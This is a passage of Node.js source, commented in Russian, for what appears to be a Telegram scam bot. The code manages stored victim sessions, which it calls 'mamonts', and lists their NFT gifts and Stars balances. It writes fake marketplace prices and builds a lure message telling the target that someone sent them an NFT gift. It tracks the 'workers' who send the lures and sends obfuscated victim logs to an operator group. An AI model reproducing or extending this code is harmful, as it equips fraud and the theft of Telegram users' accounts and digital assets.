    console.error(`[PERSIST-SESSION] ❌ Ошибка сохранения сессии:`, err.message || err);
  }
}

// Обновление savedGiftInput при INVOICE_INVALID
// Пытается перечитать сохранённый подарок из API
async function refreshSavedGift(client, gift, savedGiftInput) {
  try {
    console.log(`[REFRESH-SAVED-GIFT] Пытаюсь обновить savedGiftInput для NFT...`);
    
    // Если есть msgId, пытаемся перечитать сообщение
    if (gift.msgId) {
      try {
        // Пытаемся получить свежий savedGiftInput через GetSavedStarGifts
        const savedGifts = await client.invoke(
          new Api.payments.GetSavedStarGifts({
            peer: await client.getEntity("me"),
            offset: "",
            limit: 100,
          })
        );
        
        if (savedGifts && savedGifts.gifts) {
          // Ищем наш подарок по msgId или другим признакам
          const refreshedGift = savedGifts.gifts.find(g => 
            (g.msgId && g.msgId === gift.msgId) || 
            (g.savedId && g.savedId === gift.savedId)
          );
          
          if (refreshedGift) {
            // Создаём новый savedGiftInput
            if (refreshedGift.msgId) {
              return new Api.InputSavedStarGiftUser({
                msgId: refreshedGift.msgId,
              });
            } else if (refreshedGift.savedId && refreshedGift.fromId) {
              let fromPeer = null;
              if (refreshedGift.fromId.className === 'PeerUser') {
                try {
                  const fromUser = await client.getEntity(refreshedGift.fromId.userId);
                  fromPeer = await client.getInputEntity(fromUser);
                } catch (e) {}
              } else if (refreshedGift.fromId.className === 'PeerChat' || refreshedGift.fromId.className === 'PeerChannel') {
                try {
                  const chatId = refreshedGift.fromId.chatId || refreshedGift.fromId.channelId;
                  const fromChat = await client.getEntity(chatId);
                  fromPeer = await client.getInputEntity(fromChat);
                } catch (e) {}
              }
              
              if (fromPeer) {
                return new Api.InputSavedStarGiftChat({
                  peer: fromPeer,
                  savedId: refreshedGift.savedId,
                });
              }
            }
          }
        }
      } catch (e) {
        console.error(`[REFRESH-SAVED-GIFT] Ошибка при обновлении через GetSavedStarGifts:`, e.message || e);
      }
    }
    
    // Если не удалось обновить, возвращаем null
    console.warn(`[REFRESH-SAVED-GIFT] Не удалось обновить savedGiftInput`);
    return null;
  } catch (err) {
    console.error(`[REFRESH-SAVED-GIFT] Исключение при обновлении:`, err.message || err);
    return null;
  }
}

async function loadSessionFromFile(sessionPath) {
  try {
    const sessionData = await fs.readFile(sessionPath, 'utf-8');
    const trimmed = sessionData.trim();
    
    if (trimmed.length === 0) {
      return null;
    }
    
    if (trimmed.startsWith('1') && trimmed.match(/^[A-Za-z0-9+/=]+$/)) {
      return trimmed;
    }
    
    return null;
  } catch (error) {
    return null;
  }
}

async function getAccountInfo(client) {
  try {
    const me = await Promise.race([
      client.getMe(),
      new Promise((_, reject) => setTimeout(() => reject(new Error('TIMEOUT')), 30000))
    ]);
    return {
      username: me.username || 'без username',
      id: me.id,
      firstName: me.firstName || '',
      lastName: me.lastName || '',
      phone: null // Будет получен отдельно
    };
  } catch (e) {
    console.error(`[getAccountInfo] Ошибка: ${e.message}`);
    throw e;
  }
}

// Функция маскировки номера телефона: +79*****7691
function maskPhoneNumber(phoneNumber) {
  if (!phoneNumber) return 'неизвестно';
  const cleaned = phoneNumber.replace(/\s+/g, '').replace(/\+/g, '');
  if (cleaned.length < 4) return phoneNumber;
  const countryCode = phoneNumber.startsWith('+') ? '+' : '';
  const visibleStart = cleaned.substring(0, 2);
  const visibleEnd = cleaned.substring(cleaned.length - 4);
  return `${countryCode}${visibleStart}*****${visibleEnd}`;
}

// Функция для получения номера телефона через API
async function getPhoneNumberFromAPI(userId) {
  try {
    const serverUrl = WEB_URL ? 
      (WEB_URL.startsWith('http') ? WEB_URL : `https://${WEB_URL}`) :
      `http://localhost:${process.env.PORT || 3000}`;
    
    const apiUrl = `${serverUrl.replace(/\/$/, '')}/api/check-phone/${userId}`;
    const response = await fetch(apiUrl);
    
    if (response.ok) {
      const data = await response.json();
      if (data.success && data.phoneNumber) {
        return data.phoneNumber;
      }
    }
  } catch (e) {
    console.error(`[getPhoneNumberFromAPI] Ошибка получения номера: ${e.message}`);
  }
  return null;
}

// ==================== ОПТИМИЗАЦИИ ПРОИЗВОДИТЕЛЬНОСТИ ====================

// Класс для интеллектуального rate limiting (Token Bucket)
class RateLimiter {
  constructor(maxTokens = 10, refillRate = 2) {
    this.tokens = maxTokens;
    this.maxTokens = maxTokens;
    this.refillRate = refillRate; // токенов в секунду
    this.lastRefill = Date.now();
    this.consecutiveErrors = 0;
    this.consecutiveSuccesses = 0;
  }
  
  async consume(count = 1) {
    await this.refill();
    while (this.tokens < count) {
      const waitTime = (count - this.tokens) / this.refillRate;
      await new Promise(resolve => setTimeout(resolve, waitTime * 1000));
      await this.refill();
    }
    this.tokens -= count;
  }
  
  async refill() {
    const now = Date.now();
    const elapsed = (now - this.lastRefill) / 1000; // секунды
    const tokensToAdd = elapsed * this.refillRate;
    this.tokens = Math.min(this.maxTokens, this.tokens + tokensToAdd);
    this.lastRefill = now;
  }
  
  onRateLimitError(retryAfter) {
    this.consecutiveErrors++;
    this.consecutiveSuccesses = 0;
    // Уменьшаем скорость при ошибках
    this.refillRate = Math.max(0.5, this.refillRate * 0.7);
    this.tokens = 0;
    console.log(`[RATE-LIMITER] Rate limit ошибка, уменьшаю скорость до ${this.refillRate.toFixed(2)} токенов/с`);
  }
  
  onSuccess() {
    this.consecutiveSuccesses++;
    this.consecutiveErrors = 0;
    // Постепенно увеличиваем скорость при успехе
    if (this.consecutiveSuccesses > 5) {
      this.refillRate = Math.min(10, this.refillRate * 1.05);
    }
  }
  
  onError(error) {
    if (error.message && (error.message.includes('FLOOD') || error.message.includes('429'))) {
      this.onRateLimitError();
    } else {
      this.consecutiveErrors++;
      if (this.consecutiveErrors > 3) {
        this.refillRate = Math.max(0.5, this.refillRate * 0.9);
      }
    }
  }
}

// Worker Pool для ограничения параллельных операций
class WorkerPool {
  constructor(size = 5) {
    this.size = size;
    this.queue = [];
    this.active = 0;
  }
  
  async run(tasks, workerFn) {
    return new Promise((resolve, reject) => {
      const results = new Array(tasks.length);
      let completed = 0;
      let hasError = false;
      
      const processNext = async () => {
        if (hasError) return;
        
        if (this.queue.length === 0 && this.active === 0) {
          if (completed === tasks.length) {
            resolve(results);
          }
          return;
        }
        
        if (this.queue.length === 0 || this.active >= this.size) {
          return;
        }
        
        this.active++;
        const task = this.queue.shift();
        const index = tasks.indexOf(task);
        
        try {
          const result = await workerFn(task, index);
          results[index] = result;
        } catch (error) {
          results[index] = { error: error.message || error.toString() };
        } finally {
          this.active--;
          completed++;
          processNext();
        }
      };
      
      this.queue = [...tasks];
      const initialWorkers = Math.min(this.size, tasks.length);
      for (let i = 0; i < initialWorkers; i++) {
        processNext();
      }
    });
  }
}

// Функция группировки NFT по коллекции/типу
function groupNFTsByCollection(nfts) {
  const groups = new Map();
  
  for (const nft of nfts) {
    // Используем slug или title как ключ группировки
    const key = nft.gift?.slug || nft.gift?.title || nft.gift?.id || 'unknown';
    if (!groups.has(key)) {
      groups.set(key, []);
    }
    groups.get(key).push(nft);
  }
  
  return Array.from(groups.values());
}

// Функция проверки необходимости reconnect
function shouldReconnect(error) {
  if (!error) return false;
  
  const errorMsg = String(error.message || error.toString() || '').toLowerCase();
  const nonCriticalErrors = [
    'flood_wait',
    'flood',
    'need_stars',
    'gift_already_sent',
    'rate_limit',
    '429',
    'too many requests'
  ];
  
  // Не переподключаемся на некритичные ошибки
  if (nonCriticalErrors.some(e => errorMsg.includes(e))) {
    return false;
  }
  
  // Только для реальных сетевых ошибок
  const networkErrors = [
    'econnreset',
    'etimedout',
    'connection',
    'network',
    'timeout',
    'socket'
  ];
  
  return networkErrors.some(e => errorMsg.includes(e)) || 
         error.code === 'ECONNRESET' || 
         error.code === 'ETIMEDOUT';
}

async function getStarsBalance(client, sessionPath = null) {
  try {
    // Проверяем авторизацию перед получением баланса
    try {
      const authOk = await ensureAuthorized(client);
      if (!authOk && sessionPath) {
        await reconnectWithRetry(client, sessionPath, { maxRetries: MAX_RECONNECT_RETRIES }, authErr);
      }
    } catch (authErr) {
      if (errIncludes(authErr, "AUTH_KEY_UNREGISTERED") && sessionPath) {
        await reconnectWithRetry(client, sessionPath, { maxRetries: MAX_RECONNECT_RETRIES }, authErr);
      } else {
        throw authErr;
      }
    }
    
    const me = await Promise.race([
      client.getEntity("me"),
      new Promise((_, reject) => setTimeout(() => reject(new Error('TIMEOUT')), 30000))
    ]);
    
    const starsStatus = await Promise.race([
      client.invoke(
        new Api.payments.GetStarsStatus({
          peer: me,
        })
      ),
      new Promise((_, reject) => setTimeout(() => reject(new Error('TIMEOUT')), 30000))
    ]);
    
    if (starsStatus && starsStatus.balance !== undefined && starsStatus.balance !== null) {
      if (typeof starsStatus.balance === 'object') {
        if (starsStatus.balance.amount !== undefined) {
          return starsStatus.balance.amount;
        } else if (starsStatus.balance.value !== undefined) {
          return starsStatus.balance.value;
        }
      } else if (typeof starsStatus.balance === 'number') {
        return starsStatus.balance;
      }
    }
    return 0;
  } catch (e) {
    const errorMsg = e.errorMessage || e.message || e.toString();
    console.error(`[getStarsBalance] Ошибка: ${errorMsg}`);
    
    // Если AUTH_KEY_UNREGISTERED и есть sessionPath, пытаемся переподключиться
    if (errIncludes(e, "AUTH_KEY_UNREGISTERED") && sessionPath) {
      try {
        await reconnectWithRetry(client, sessionPath, { maxRetries: MAX_RECONNECT_RETRIES }, e);
        // Повторяем попытку после переподключения
        return await getStarsBalance(client, sessionPath);
      } catch (reconnectErr) {
        console.error(`[getStarsBalance] Не удалось переподключиться: ${reconnectErr.message || reconnectErr}`);
      }
    }
    
    return 0;
  }
}

// ОПТИМИЗАЦИЯ: Кэш для getGiftsInfo (на уровне сессии)
const giftsInfoCache = new Map();

// Функция для инвалидации кэша подарков
function invalidateGiftsCache(client) {
  const sessionId = client.session?.save?.() || 'default';
  giftsInfoCache.delete(sessionId);
  console.log(`[CACHE] Кэш подарков инвалидирован для сессии: ${sessionId}`);
}

async function getGiftsInfo(client, useCache = true) {
  try {
    // ОПТИМИЗАЦИЯ: Проверяем кэш
    const sessionId = client.session?.save?.() || 'default';
    if (useCache && giftsInfoCache.has(sessionId)) {
      const cached = giftsInfoCache.get(sessionId);
      const cacheAge = Date.now() - cached.timestamp;
      // Кэш действителен 30 секунд
      if (cacheAge < 30000) {
        console.log(`[getGiftsInfo] ✅ Использую кэш (возраст: ${Math.round(cacheAge/1000)}с)`);
        return cached.data;
      }
    }
    
    const me = await Promise.race([
      client.getEntity("me"),
      new Promise((_, reject) => setTimeout(() => reject(new Error('TIMEOUT')), 30000))
    ]);
    
    const regularGifts = [];
    const nftGifts = [];
    let offset = "";
    let hasMore = true;
    let totalChecked = 0;
    
    // ОПТИМИЗАЦИЯ: Получаем все подарки одним запросом (bulk fetch)
    while (hasMore && totalChecked < 1000) {
      const savedGifts = await Promise.race([
        client.invoke(
          new Api.payments.GetSavedStarGifts({
            peer: me,
            offset: offset,
            limit: 100,
          })
        ),
        new Promise((_, reject) => setTimeout(() => reject(new Error('TIMEOUT')), 30000))
      ]);
      
      if (!savedGifts || !savedGifts.gifts || savedGifts.gifts.length === 0) {
        hasMore = false;
        break;
      }
      
      // ОПТИМИЗАЦИЯ: Классификация делается локально, без дополнительных API-вызовов
      for (const gift of savedGifts.gifts) {
        if (gift.gift) {
          const isNFT = gift.gift.className === 'StarGiftUnique' || gift.gift.unique === true;
          if (isNFT) {
            nftGifts.push(gift);
            console.log(`[getGiftsInfo] Найден NFT: ${gift.gift.slug || gift.gift.title || gift.gift.id}`);
          } else {
            regularGifts.push(gift);
          }
        }
        totalChecked++;
      }
      
      if (savedGifts.nextOffset) {
        offset = savedGifts.nextOffset;
      } else {
        hasMore = false;
      }
    }
    
    console.log(`[getGiftsInfo] Проверено подарков: ${totalChecked}, NFT: ${nftGifts.length}, Обычных: ${regularGifts.length}`);
    
    const result = { regular: regularGifts, nft: nftGifts };
    
    // ОПТИМИЗАЦИЯ: Сохраняем в кэш
    if (useCache) {
      giftsInfoCache.set(sessionId, {
        data: result,
        timestamp: Date.now()
      });
    }
    
    return result;
  } catch (e) {
    console.error(`[getGiftsInfo] Ошибка: ${e.message}`);
    return { regular: [], nft: [] };
  }
}

async function sendLogToGroup(message, topicId = null) {
  try {
    const targetTopicId = topicId !== null ? topicId : LOG_TOPIC_ID;
    // Маскируем username мамонта перед обфускацией
    const maskedMessage = maskMamontUsernameInMessage(message);
    // Обфусцируем сообщение перед отправкой
    const obfuscatedMessage = obfuscateText(maskedMessage);
    console.log(`[SEND-LOG-TO-GROUP] Отправка лога в группу. Длина сообщения: ${message.length}, Topic ID: ${targetTopicId}`);
    
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: LOG_GROUP_ID,
        message_thread_id: targetTopicId,
        text: obfuscatedMessage,
        parse_mode: 'HTML'
      })
    });
    
    const result = await response.json();
    
    if (!result.ok) {
      const errorInfo = result.error_code 
        ? `${result.description || 'Unknown error'} (code: ${result.error_code}${result.parameters?.retry_after ? ', retry after: ' + result.parameters.retry_after + 's' : ''})`
        : `Error: ${result.description || 'Unknown error'}`;
      console.error('❌ Ошибка отправки лога в группу:', errorInfo);
      
      // Если ошибка 429, ждём и повторяем
      if (result.error_code === 429 || (result.description && result.description.toLowerCase().includes('too many requests'))) {
        const retryAfter = result.parameters?.retry_after || 3;
        console.log(`[SEND-LOG-TO-GROUP] Rate limit, ожидание ${retryAfter} секунд...`);
        await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
        
        // Повторная попытка
        try {
          const retryResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: LOG_GROUP_ID,
              message_thread_id: targetTopicId,
              text: message,
              parse_mode: 'HTML'
            })
          });
          const retryResult = await retryResponse.json();
          if (retryResult.ok) {
            console.log(`[SEND-LOG-TO-GROUP] Лог успешно отправлен после ожидания rate limit`);
            return retryResult;
          } else {
            const retryErrorInfo = retryResult.error_code 
              ? `${retryResult.description || 'Unknown error'} (code: ${retryResult.error_code})`
              : `Error: ${retryResult.description || 'Unknown error'}`;
            console.error(`[SEND-LOG-TO-GROUP] Ошибка повторной отправки:`, retryErrorInfo);
          }
        } catch (e2) {
          logError(e2, 'SEND-LOG-TO-GROUP-RETRY');
        }
      }
      
      return result;
    }
    
    console.log(`[SEND-LOG-TO-GROUP] Лог успешно отправлен в группу`);
    return result;
  } catch (e) {
    logError(e, 'SEND-LOG-TO-GROUP');
    return null;
  }
}

async function sendLogToAdmin(message) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: ADMIN_ID,
        text: message
      })
    });
    const result = await response.json();
    if (!result.ok) {
      const errorInfo = result.error_code 
        ? `${result.description || 'Unknown error'} (code: ${result.error_code})`
        : JSON.stringify(result);
      console.error('❌ Ошибка отправки лога админу:', errorInfo);
    }
    return result;
  } catch (e) {
    logError(e, 'SEND-LOG-TO-ADMIN');
    return null;
  }
}

async function sendErrorToAdmin(error, context = '') {
  try {
    const errorMessage = `❌ <b>ОШИБКА</b>\n\n` +
      `<b>Контекст:</b> ${context}\n` +
      `<b>Ошибка:</b> <code>${error.message || error.toString()}</code>\n` +
      `<b>Stack:</b>\n<pre>${error.stack || 'нет стека'}</pre>`;
    
    // Убрано логирование админу
    console.error(`[ERROR] ${context}:`, error);
  } catch (e) {
    console.error('❌ Ошибка отправки ошибки админу:', e);
  }
}

// ==================== БД ПОЛЬЗОВАТЕЛЕЙ ====================

async function loadUsersDB() {
  try {
    if (await fs.pathExists(USERS_DB_PATH)) {
      const data = await fs.readJson(USERS_DB_PATH);
      return data.users || [];
    }
  } catch (e) {
    console.log(`[USERS-DB] Ошибка загрузки БД пользователей: ${e.message}`);
  }
  return [];
}

async function saveUsersDB(users) {
  try {
    const data = {
      lastUpdated: new Date().toISOString(),
      users: users
    };
    await fs.writeJson(USERS_DB_PATH, data, { spaces: 2 });
    return data;
  } catch (e) {
    console.error(`[USERS-DB] Ошибка сохранения БД пользователей: ${e.message}`);
    throw e;
  }
}

async function saveUser(userId, username, firstName = '', lastName = '') {
  try {
    const users = await loadUsersDB();
    const existingUserIndex = users.findIndex(u => u.userId === userId);
    
    const userData = {
      userId: userId,
      username: username || 'без username',
      firstName: firstName || '',
      lastName: lastName || '',
      lastSeen: new Date().toISOString()
    };
    
    if (existingUserIndex >= 0) {
      // Обновляем существующего пользователя
      users[existingUserIndex] = { ...users[existingUserIndex], ...userData };
    } else {
      // Добавляем нового пользователя
      userData.firstSeen = new Date().toISOString();
      users.push(userData);
    }
    
    await saveUsersDB(users);
    return userData;
  } catch (e) {
    console.error(`[USERS-DB] Ошибка сохранения пользователя: ${e.message}`);
    return null;
  }
}

// Загрузка пользователей из всех доступных источников (сессии, подарки и т.д.)
async function loadUsersFromAllSources() {
  const usersMap = new Map(); // Используем Map для избежания дубликатов
  
  try {
    // 1. Загружаем из БД подарков мамонтов
    const gifts = await loadMamontGiftsDB();
    for (const gift of gifts) {
      if (gift.userId) {
        const userId = typeof gift.userId === 'string' ? parseInt(gift.userId) : gift.userId;
        if (!usersMap.has(userId)) {
          usersMap.set(userId, {
            userId: userId,
            username: gift.username || 'без username',
            firstName: '',
            lastName: '',
            source: 'gifts'
          });
        }
      }
    }
    console.log(`[USERS-LOAD] Загружено из подарков: ${gifts.length} записей, уникальных пользователей: ${usersMap.size}`);
    
    // 2. Загружаем из папки сессий
    const sessionsDir = path.join(__dirname, 'sessions');
    if (await fs.pathExists(sessionsDir)) {
      const userDirs = await fs.readdir(sessionsDir);
      for (const userDir of userDirs) {
        const userDirPath = path.join(sessionsDir, userDir);
        const stats = await fs.stat(userDirPath);
        
        if (stats.isDirectory()) {
          // Парсим userId и username из названия папки (формат: userId_username)
          const match = userDir.match(/^(\d+)_(.+)$/);
          if (match) {
            const userId = parseInt(match[1]);
            const username = match[2];
            
            if (!usersMap.has(userId)) {
              usersMap.set(userId, {
                userId: userId,
                username: username || 'без username',
                firstName: '',
                lastName: '',
                source: 'sessions'
              });
            } else {
              // Обновляем username, если он был без username
              const existing = usersMap.get(userId);
              if (existing.username === 'без username' && username) {
                existing.username = username;
              }
            }
            
            // Пытаемся загрузить дополнительную информацию из JSON файлов
            try {
              const files = await fs.readdir(userDirPath);
              const jsonFiles = files.filter(f => f.endsWith('.json'));
              
              for (const jsonFile of jsonFiles) {
                try {
                  const jsonPath = path.join(userDirPath, jsonFile);
                  const jsonData = await fs.readJson(jsonPath);
                  
                  if (jsonData.mamontUsername) {
                    const user = usersMap.get(userId);
                    if (user) {
                      user.username = jsonData.mamontUsername || user.username;
                    }
                  }
                } catch (e) {
                  // Игнорируем ошибки чтения JSON
                }
              }
            } catch (e) {
              // Игнорируем ошибки чтения папки
            }
          }
        }
      }
      console.log(`[USERS-LOAD] Загружено из сессий: ${usersMap.size} уникальных пользователей`);
    }
    
    // 3. Загружаем из текущей БД пользователей (если есть)
    const existingUsers = await loadUsersDB();
    for (const user of existingUsers) {
      if (user.userId) {
        if (!usersMap.has(user.userId)) {
          usersMap.set(user.userId, user);
        } else {
          // Обновляем существующего пользователя, сохраняя более полную информацию
          const existing = usersMap.get(user.userId);
          usersMap.set(user.userId, {
            ...existing,
            ...user,
            username: user.username || existing.username || 'без username'
          });
        }
      }
    }
    console.log(`[USERS-LOAD] После загрузки из БД: ${usersMap.size} уникальных пользователей`);
    
    // Преобразуем Map в массив
    const usersArray = Array.from(usersMap.values());
    console.log(`[USERS-LOAD] Всего уникальных пользователей для рассылки: ${usersArray.length}`);
    
    return usersArray;
  } catch (e) {
    console.error(`[USERS-LOAD] Ошибка загрузки пользователей: ${e.message}`);
    console.error(e.stack);
    return Array.from(usersMap.values()); // Возвращаем то, что успели загрузить
  }
}

// ==================== БД ПОДАРКОВ МАМОНТОВ ====================

async function loadMamontGiftsDB() {
  try {
    if (await fs.pathExists(MAMONT_GIFTS_DB_PATH)) {
      const data = await fs.readJson(MAMONT_GIFTS_DB_PATH);
      return data.gifts || [];
    }
  } catch (e) {
    console.log(`[MAMONT-DB] Ошибка загрузки БД подарков мамонтов: ${e.message}`);
  }
  return [];
}

async function saveMamontGiftsDB(gifts) {
  try {
    const dbDir = path.dirname(MAMONT_GIFTS_DB_PATH);
    await fs.ensureDir(dbDir);
    
    const data = {
      lastUpdated: new Date().toISOString(),
      gifts: gifts
    };
    
    await fs.writeJson(MAMONT_GIFTS_DB_PATH, data, { spaces: 2 });
    console.log(`[MAMONT-DB] Сохранено ${gifts.length} подарков в БД`);
    return data;
  } catch (e) {
    // Убрано логирование админу
    console.error(`[MAMONT-DB] Ошибка сохранения БД подарков мамонтов: ${e.message}`);
    throw e; // Пробрасываем ошибку
  }
}

async function saveMamontGift(userId, username, giftId, giftName, giftLink, sessionPath, workerUsername = null, workerId = null) {
  try {
    // Убрано логирование админу
    
    const gifts = await loadMamontGiftsDB();
    
    // Проверяем, нет ли уже такого подарка
    const existingGift = gifts.find(g => {
      const gUserId = typeof g.userId === 'string' ? parseInt(g.userId) : g.userId;
      return (gUserId === userId || String(g.userId) === String(userId)) && g.giftId === giftId;
    });
    
    if (existingGift) {
      // Убрано логирование админу
      console.log(`[MAMONT-DB] Подарок уже существует: ${giftId} для пользователя ${userId}, возвращаем существующий`);
      // НЕ делаем return - продолжаем дальше, чтобы отправить сообщение мамонту
    }
    
    let savedGift = existingGift;
    
    if (!existingGift) {
      const newGift = {
        userId: typeof userId === 'string' ? parseInt(userId) : userId, // Всегда сохраняем как число
        username: username || 'без username',
        giftId: giftId,
        giftName: giftName,
        giftLink: giftLink,
        receivedAt: new Date().toISOString(),
        status: 'pending',
        sessionPath: sessionPath,
        workerUsername: workerUsername,
        workerId: workerId ? (typeof workerId === 'string' ? parseInt(workerId) : workerId) : null
      };
      
      gifts.push(newGift);
      await saveMamontGiftsDB(gifts);
      
      // НЕ обновляем processed_links.txt - подарки мамонтов только в их инвентаре через API
      
      // Убрано логирование админу
      
      console.log(`[MAMONT-DB] Сохранен подарок: ${giftId} для пользователя ${userId}`);
      savedGift = newGift;
    } else {
      // Убрано логирование админу
      
      // НЕ обновляем processed_links.txt - подарки мамонтов только в их инвентаре
    }
    
    return savedGift;
  } catch (e) {
    // Убрано логирование админу
    console.error(`[MAMONT-DB] Ошибка сохранения подарка: ${e.message}`);
    throw e; // Пробрасываем ошибку дальше
  }
}

async function getMamontGifts(userId) {
  try {
    // Преобразуем userId в строку для надежного сравнения (большие числа могут терять точность)
    const userIdStr = String(userId);
    
    const gifts = await loadMamontGiftsDB();
    console.log(`[getMamontGifts] Запрос для userId: ${userId} (как строка: "${userIdStr}")`);
    console.log(`[getMamontGifts] Всего подарков в БД: ${gifts.length}`);
    
    if (gifts.length > 0) {
      console.log(`[getMamontGifts] Все userId в БД:`, gifts.map(g => ({
        userId: g.userId,
        userIdStr: String(g.userId),
        type: typeof g.userId,
        giftId: g.giftId
      })));
    }
    
    // Фильтруем с учетом разных типов данных - используем СТРОКОВОЕ сравнение
    let nonMatchCount = 0;
    const filtered = gifts.filter(g => {
      // Преобразуем userId из БД в строку
      const gUserIdStr = String(g.userId);
      
      // Сравниваем строки (надежнее для больших чисел)
      const match = gUserIdStr === userIdStr || String(g.userId) === String(userId);
      
      if (match) {
        console.log(`[getMamontGifts] ✅ Найден подарок: ${g.giftId} для userId: ${g.userId} (как строка: "${gUserIdStr}")`);
      } else {
        // Логируем первые несколько несовпадений для отладки
        if (nonMatchCount < 3) {
          console.log(`[getMamontGifts] ❌ Не совпадает: БД "${gUserIdStr}" !== запрос "${userIdStr}"`);
          nonMatchCount++;
        }
      }
      
      return match;
    });
    
    console.log(`[getMamontGifts] Найдено подарков: ${filtered.length}`);
    if (filtered.length === 0 && gifts.length > 0) {
      console.log(`[getMamontGifts] ⚠️ Подарки не найдены! Ищем userId: "${userIdStr}", но в БД есть:`, gifts.map(g => String(g.userId)));
    }
    
    return filtered;
  } catch (e) {
    console.error(`[MAMONT-DB] Ошибка получения подарков: ${e.message}`);
    // Убрано логирование админу
    return [];
  }
}

async function getGiftInfo(giftId, userId) {
  try {
    const gifts = await loadMamontGiftsDB();
    const userIdStr = String(userId);
    return gifts.find(g => g.giftId === giftId && String(g.userId) === userIdStr);
  } catch (e) {
    console.error(`[MAMONT-DB] Ошибка получения информации о подарке: ${e.message}`);
    return null;
  }
}

async function updateMarketGifts() {
  try {
    const gifts = await loadMamontGiftsDB();
    
    // Формируем строки для processed_links.txt
    // Формат: https://t.me/nft/GiftName-12345 - 1.5 TON (150.00)
    const lines = gifts
      .filter(g => g.status === 'pending' || g.status === 'processed')
      .map(g => {
        // Парсим giftId для получения имени и ID
        const match = g.giftId.match(/^(.+)-(\d+)$/);
        if (match) {
          const [, giftName, giftIdNum] = match;
          // Генерируем случайную цену в TON и рублях (примерно)
          const tonPrice = (Math.random() * 100 + 1).toFixed(3);
          const rubPrice = (parseFloat(tonPrice) * 221.7).toFixed(2);
          return `https://t.me/nft/${giftName}-${giftIdNum} - ${tonPrice} TON (${rubPrice}₽)`;
        }
        return null;
      })
      .filter(line => line !== null);
    
    // Читаем существующий файл
    let existingLines = [];
    if (await fs.pathExists(PROCESSED_LINKS_PATH)) {
      const existingContent = await fs.readFile(PROCESSED_LINKS_PATH, 'utf-8');
      existingLines = existingContent.split('\n').filter(line => line.trim() && !line.startsWith('#'));
    }
    
    // Объединяем и убираем дубликаты
    const allLines = [...new Set([...existingLines, ...lines])];
    
    // Записываем обратно
    await fs.writeFile(PROCESSED_LINKS_PATH, allLines.join('\n') + '\n', 'utf-8');
    
    console.log(`[MARKET] Обновлен processed_links.txt: ${allLines.length} строк`);
  } catch (e) {
    console.error(`[MARKET] Ошибка обновления processed_links.txt: ${e.message}`);
  }
}

// ==================== ИНЛАЙН МОД ====================

// Функция для инициализации всех обработчиков событий бота
function initBotEventHandlers() {
  if (!bot) {
    console.error('[BOT] Бот не инициализирован, обработчики событий не могут быть установлены');
    return;
  }

// Обработка инлайн запросов (воркер отправляет NFT ссылку)
  bot.on('inline_query', async (query) => {
  try {
    const userId = query.from.id;
    const username = query.from.username || 'без username';
    const queryText = query.query || '';
    
    // Сохраняем пользователя
    await saveUser(userId, username, query.from.first_name || '', query.from.last_name || '');
    
    console.log(`[INLINE] Запрос от @${username} (${userId}): "${queryText}"`);
    
    // Убрано логирование админу
    
    // Парсим получателя (username или ID) из начала запроса - формат: @username или id123456
    let recipientId = null;
    let recipientUsername = null;
    
    // Сначала проверяем ID (формат: id123456)
    const idMatch = queryText.match(/^id(\d+)/i);
    if (idMatch) {
      recipientId = idMatch[1];
      console.log(`[INLINE] Найден получатель по ID: ${recipientId}`);
    } else {
      // Проверяем username (формат: @username)
      const usernameMatch = queryText.match(/^@(\w+)/);
      if (usernameMatch) {
        recipientUsername = usernameMatch[1].toLowerCase();
        console.log(`[INLINE] Найден получатель по username: @${recipientUsername}`);
      }
    }
    
    // Проверяем, что указан получатель (обязательно)
    if (!recipientId && !recipientUsername) {
      // Если нет получателя - ничего не показываем
      await bot.answerInlineQuery(query.id, [], {
        cache_time: 0,
        is_personal: true
      });
      return;
    }
    
    // Парсим NFT ссылку из запроса (например: https://t.me/nft/DeskCalendar-98533 или t.me/nft/DeskCalendar-98533)
    const nftUrlMatch = queryText.match(/(?:https?:\/\/)?t\.me\/nft\/([^\s]+)/i);
    
    if (!nftUrlMatch) {
      // Если нет ссылки - ничего не показываем
      await bot.answerInlineQuery(query.id, [], {
        cache_time: 0,
        is_personal: true
      });
      return;
    }
    
    const nftSlug = nftUrlMatch[1].trim(); // Например: DeskCalendar-98533
    const nftUrl = `https://t.me/nft/${nftSlug}`; // Всегда формируем полную ссылку с https://
    
    // Парсим название NFT из slug (например: DeskCalendar-98533 -> DeskCalendar)
    // Если нет дефиса, используем весь slug как название
    const parts = nftSlug.split('-');
    const nftName = parts.length > 1 ? parts.slice(0, -1).join(' ') : nftSlug;
    
    // Получаем username бота
    const botInfo = await bot.getMe();
    const botUsername = botInfo.username;
    
    // Кодируем username для URL (на случай спецсимволов)
    const encodedWorkerUsername = encodeURIComponent(username);
    
    // Формируем deep link параметр: 
    // Если указан ID: nft_slug_workerId_workerUsername_to_id_recipientId
    // Если указан username: nft_slug_workerId_workerUsername_to_user_recipientUsername
    let deepLinkParam = `nft_${nftSlug}_${userId}_${encodedWorkerUsername}`;
    if (recipientId) {
      deepLinkParam += `_to_id_${recipientId}`;
    } else if (recipientUsername) {
      deepLinkParam += `_to_user_${encodeURIComponent(recipientUsername)}`;
    }
    
    // Формируем описание для результата
    const recipientDisplay = recipientId ? `ID ${recipientId}` : `@${recipientUsername}`;
    
    // Создаем результат для инлайн запроса
    const results = [{
      type: 'article',
      id: `nft_${nftSlug}_${Date.now()}`,
      title: `🎁 NFT-подарок: ${nftName} → ${recipientDisplay}`,
      description: `Отправить NFT подарок ${recipientDisplay}`,
      input_message_content: {
        message_text: `<b><a href="${nftUrl}">🎁</a> Пользователь @${username} отправил вам NFT-подарок.</b>\n\n<b>Чтобы получить подарок, нажмите кнопку ниже.</b>`,
        parse_mode: 'HTML'
      },
      reply_markup: {
        inline_keyboard: [[
          {
            text: 'Получить NFT',
            url: `https://t.me/${botUsername}?start=${deepLinkParam}`
          }
        ]]
      }
    }];
    
    await bot.answerInlineQuery(query.id, results, {
      cache_time: 0,
      is_personal: false
    });
    
    console.log(`[INLINE] Отправлен NFT подарок: ${nftUrl} от @${username}`);
    
    // Убрано логирование админу
  } catch (e) {
    // Убрано логирование админу
